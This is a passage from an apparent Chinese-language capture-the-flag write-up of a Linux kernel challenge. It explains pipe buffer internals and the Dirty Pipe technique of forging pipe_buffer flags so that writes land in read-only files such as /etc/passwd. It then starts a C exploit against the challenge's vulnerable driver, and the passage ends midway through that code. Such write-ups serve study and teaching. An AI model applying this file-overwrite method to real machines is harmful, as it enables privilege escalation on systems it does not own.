<h2 id="Dirty-pipe"><a href="#Dirty-pipe" class="headerlink" title="Dirty pipe"></a>Dirty pipe</h2><h3 id="analyze-3"><a href="#analyze-3" class="headerlink" title="analyze"></a>analyze</h3><p>基本上跟上一題一樣<br>不過所有功能都有<br>不過他使用了  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">obj_alloc</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    obj = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> obj), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以現在有一個 general cache <code>kmalloc-1k</code> 的 kmem_cache UAF  </p>
<h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h3><p>可以嘗試 dirty pipe<br>先來介紹一下<br>pipe 是用於不同 process 之間通訊的一個東西  </p>
<p>kernel 會創建一個 inode<br>並分配兩個 file descriptor 來去做為讀端及寫端  </p>
<ul>
<li>pipe_inode_info 存放著該 pipe 的 metadata</li>
<li>pipe_buffer 是用來存放 pipe 實際上傳遞的資料</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.15.9/source/include/linux/pipe_fs_i.h#L86">https://elixir.bootlin.com/linux/v6.15.9/source/include/linux/pipe_fs_i.h#L86</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *	@mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *	@rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *	@wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *	@head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *	@tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *	@head_tail: unsigned long union of @head and @tail</span></span><br><span class="line"><span class="comment"> *	@note_loss: The next read() should insert a data-lost message</span></span><br><span class="line"><span class="comment"> *	@max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *	@ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *	@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *	@tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *	@readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *	@writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *	@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *	@r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *	@w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *	@poll_usage: is this pipe used for epoll, which has crazy wakeups?</span></span><br><span class="line"><span class="comment"> *	@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *	@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *	@bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *	@user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> *	@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This has to match the &#x27;union pipe_index&#x27; above */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> head_tail;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="type">pipe_index_t</span> head;</span><br><span class="line">			<span class="type">pipe_index_t</span> tail;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line">	<span class="type">bool</span> poll_usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>[2];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>head: 下一個寫入位置</li>
<li>tail: 下一個讀取位置</li>
<li>rd_wait &#x2F; wr_wait<ul>
<li>當 pipe 為空時，讀端進入 rd_wait 等待</li>
<li>當 pipe 為滿時，寫端進入 wr_wait 等待</li>
</ul>
</li>
<li>max_usage: ring buffer 可使用的最大 buffer 數</li>
<li>readers &#x2F; writers: 當前活躍的讀端與寫端數量</li>
<li>files: 有多少個 struct file 引用這個 pipe（受 -&gt;i_lock 保護）</li>
<li>r_counter &#x2F; w_counter: 計數器，追蹤端點操作，主要用於判斷狀態變化與喚醒邏輯</li>
<li>poll_usage: 表示此 pipe 是否用於 epoll（因為 epoll 會造成更頻繁的 wakeup，需要特殊處理）</li>
<li>tmp_page: 暫存釋放掉的 page</li>
<li>bufs: 指向真正的環形緩衝區</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.15.9/source/include/linux/pipe_fs_i.h#L26">https://elixir.bootlin.com/linux/v6.15.9/source/include/linux/pipe_fs_i.h#L26</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *	@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *	@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *	@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *	@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *	@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *	@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>pipe_buffer 就是用來存資料的地方，每個 pipe 管理了一些 page 來存  </p>
<p>這部分 read write 實作先不下 source code<br>先來看概念  </p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-286449.html">https://bbs.kanxue.com/thread-286449.html</a></p>
<p>整個結構長這樣  </p>
<img src="/2025/10/24/speed-run-r1rn-kernel-challenge/ring_buffer.png" class="">
<img src="/2025/10/24/speed-run-r1rn-kernel-challenge/ring_buffer2.png" class="">


<p>剛剛提到<br>head 是一個 寫入 pointer<br>tail 是一個 讀取 pointer  </p>
<p>pipe inode metadata 中的 bufs pointer 就管理了一個 0x10 個 pipe_buffer (使用上像是環形的)<br>並且有兩種狀態<br>緩衝區空：當 head &#x3D;&#x3D; tail<br>表示沒有數據可讀，寫指標追上讀指標了，管道中沒有有效數據。  </p>
<p>緩衝區滿：當 (head - tail) &#x3D;&#x3D; N<br>表示寫指標比讀指標快 N 個緩衝槽位，管道已寫滿，不能再寫入數據，寫入方需要阻塞等待。  </p>
<ul>
<li>pipe_write (寫入東西到 pipe_buffer)<ul>
<li>通過 head &amp; mask 來去找到當前要寫入的 page</li>
<li>第一次寫入設定 <code>bufs[i]-&gt;flags</code> 被設置成 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 或是 <code>PIPE_BUF_FLAG_PACKET</code> (網路封包)</li>
<li><code>copy_page_from_iter</code> 被 call，將 userspace 想傳的資料暫存在 kernel space 的 pipe_buffer 中</li>
<li>更新 head 到下一個 page</li>
</ul>
</li>
<li>pipe_read (讀取東西到 userspace，另一個 process)<ul>
<li>通過 tail &amp; mask 來去找到當前要讀取的 page</li>
<li><code>copy_page_from_iter</code> 被 call，將資料從該 page 的 <code>buf-&gt;offset</code> 開始 copy，並更新 <code>buf-&gt;offset</code> 和 <code>buf-&gt;len</code> (offset 是從哪裡開始讀，len 是讀多長)</li>
<li>更新 tail 到下一個 page</li>
<li>若緩衝區為空，就代表沒事了</li>
</ul>
</li>
</ul>
<p>稍微 demo 一下用法大概長這樣  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> pipefd1[<span class="number">2</span>]; <span class="comment">// 第一個 pipe</span></span><br><span class="line">    <span class="type">int</span> pipefd2[<span class="number">2</span>]; <span class="comment">// 第二個 pipe</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd1) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;pipe1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd2) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;pipe2&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *msg = <span class="string">&quot;Rana is so cute!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    write(pipefd1[<span class="number">1</span>], msg, <span class="built_in">strlen</span>(msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pipe fd1 read --&gt; pipe fd2 write</span></span><br><span class="line">    <span class="type">ssize_t</span> n = splice(pipefd1[<span class="number">0</span>], <span class="literal">NULL</span>, pipefd2[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="built_in">strlen</span>(msg), SPLICE_F_MOVE | SPLICE_F_MORE);</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;splice&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;splice moved %zd bytes\n&quot;</span>, n);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read pipe fd2 write data to buf</span></span><br><span class="line">    <span class="type">ssize_t</span> r = read(pipefd2[<span class="number">0</span>], buf, <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (r == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read from pipe2: %s&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    close(pipefd1[<span class="number">0</span>]);</span><br><span class="line">    close(pipefd1[<span class="number">1</span>]);</span><br><span class="line">    close(pipefd2[<span class="number">0</span>]);</span><br><span class="line">    close(pipefd2[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="attack-3"><a href="#attack-3" class="headerlink" title="attack"></a>attack</h3><p>如果有開啟 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 可以在不超過一個 page 的狀況下，繼續去續寫 page<br>但如果我們去改寫 flags 成這樣然後把 len 改成 0 (offset 大概都是 0)<br>來讓 kernel pipe 誤認為該段可以追加寫入，可以寫入 &#x2F;etc&#x2F;passwd  </p>
<p>可以看這段沒有去驗證當前權限直接將東西寫入  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">	ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	buf-&gt;len += ret;</span><br><span class="line">	<span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>總結一句話，若你是直接對 file 做寫入那就是會去驗證檔案權驗<br>但是因為 flags 被改，誤認為這是追加寫入，讓我們可以去寫入 pipe_buffer<br>他會被映射到對應的 page 上(沒有檢查) 來做到任意寫入檔案  </p>
<p>Dirty pipe 也可以看這個<br><a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/">https://dirtypipe.cm4all.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://u1f383.github.io/linux/2024/08/16/linux-kernel-use-pipe-object-to-do-data-only-attack.html">https://u1f383.github.io/linux/2024/08/16/linux-kernel-use-pipe-object-to-do-data-only-attack.html</a></p>
<h3 id="exploit-3"><a href="#exploit-3" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc exploit.c -o exploit --static -masm=intel</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_ALLOC   0xf000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_READ    0xf001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_WRITE   0xf002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_FREE    0xf003</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">&#125; <span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">int</span> etcpasswd_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_alloc</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;&#125;;</span><br><span class="line">    ioctl(fd, CMD_ALLOC, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_write</span><span class="params">(<span class="type">size_t</span> size, <span class="type">char</span>* data)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;</span><br><span class="line">        .size = size,</span><br><span class="line">        .data = data</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, CMD_WRITE, &amp;req);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_read</span><span class="params">(<span class="type">size_t</span> size, <span class="type">char</span>* data)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;</span><br><span class="line">        .size = size,</span><br><span class="line">        .data = data</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    ioctl(fd, CMD_READ, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_free</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CMD_FREE, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_zoneinfo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;/proc/zoneinfo&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="type">char</span> line[<span class="number">256</span>];</span><br><span class="line">    <span class="type">int</span> in_pagesets = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> current_cpu = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;pagesets&quot;</span>)) &#123;</span><br><span class="line">            in_pagesets = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_pagesets &amp;&amp; line[<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span> &amp;&amp; line[<span class="number">0</span>] != <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line">            in_pagesets = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_pagesets) &#123;</span><br><span class="line">            <span class="type">int</span> cpu_id;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot; cpu: %d&quot;</span>, &amp;cpu_id) == <span class="number">1</span>) &#123;</span><br><span class="line">                